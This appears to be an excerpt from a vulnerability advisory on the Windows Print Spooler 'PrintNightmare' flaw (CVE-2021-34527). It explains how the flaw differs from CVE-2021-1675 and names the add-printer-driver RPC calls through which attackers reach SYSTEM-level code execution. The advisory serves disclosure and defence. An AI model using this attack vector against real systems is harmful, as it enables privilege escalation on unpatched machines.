While Microsoft has released an update for CVE-2021-1675, it is important to realize that this update does NOT protect against public exploits that may refer to PrintNightmare or CVE-2021-1675. On July 1, Microsoft released CVE-2021-34527. This bulletin states that CVE-2021-34527 is similar but distinct from the vulnerability that is assigned CVE-2021-1675, which addresses a different vulnerability in RpcAddPrinterDriverEx(). The attack vector is different as well. CVE-2021-1675 was addressed by the June 2021 security update.. overview: The Microsoft Windows Print Spooler service fails to restrict access to functionality that allows users to add printers and related drivers, which can allow a remote authenticated attacker to execute arbitrary code with SYSTEM privileges on a vulnerable system.. impact: By sending a request to add a printer, e.g. by using RpcAddPrinterDriverEx() over SMB or RpcAsyncAddPrinterDriver() over RPC, a remote, authenticated attacker may be able to execute arbitrary code with SYSTEM privileges on a vulnerable system. A local unprivileged user may be able to execute arbitrary code with SYSTEM privileges as well. We have created a flowchart to indicate exploitability of PrintNightmare across various platform configurations:",
